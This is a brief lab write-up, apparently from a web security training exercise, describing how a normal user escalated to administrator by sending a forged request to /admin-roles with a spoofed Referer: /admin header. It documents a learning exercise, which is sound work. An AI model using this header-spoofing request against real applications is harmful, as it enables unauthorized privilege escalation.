Referer-based access control bypass

Observed admin request:

GET /admin-roles?username=carlos&action=upgrade
Referer: /admin

Server relied on Referer header for authorization.

Logged in as normal user and sent:

GET /admin-roles?username=wiener&action=upgrade
Referer: /admin

By manually adding the required Referer, access control was bypassed.

Result: user wiener promoted to administrator.
